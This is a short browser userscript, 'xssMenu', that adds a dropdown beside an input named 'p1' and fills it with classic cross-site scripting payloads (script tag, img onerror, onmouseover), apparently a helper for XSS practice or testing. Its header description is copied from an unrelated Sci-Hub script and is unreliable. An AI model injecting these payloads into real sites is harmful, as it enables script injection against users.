// ==UserScript==
// @name         xssMenu
// @namespace    hi
// @version      0.31
// @description  Add sci-hub button on article page. Add sci-hub button after article link. Support Google scholar, bing academic and baidu xueshu. Jump CNKI English article to Chinese article.
// @author       Dingar
// @include      *
// ==/UserScript==

var inputs = document.getElementsByTagName('input');
var textBox = document.getElementsByName("p1")[0]
var textBoxRect = textBox.getBoundingClientRect();



var select = document.createElement("select");
select.id = "mySelect";






var payloads = [" ", "<script>alert(document.domain)</script>","<img src='#' onerror=alert(document.domain) />","<b onmouseover=alert(document.domain)>click me!</b>"];


var select_width = 200;
var select_height = 40;
var selectX = textBoxRect.right + 65; // Adjust 10 pixels to the right of the text box
var selectY = textBoxRect.top - 10;

select.style = "position:absolute; top:" + selectY + "px; left:" + selectX + "px; background-color: #00ccff; border-radius: 10px; font-size: 20px; width:" + select_width + "px; height:" + select_height + "px";
select.style.opacity = "0.9";


select.onchange = function () {
    document.getElementsByName("p1")[0].value = select.value
};

for (var i = 0; i < payloads.length; i++) {
    var option = document.createElement("option");
    option.value = payloads[i];
    option.text = payloads[i];
    select.appendChild(option);
}


textBox.parentNode.appendChild(select);
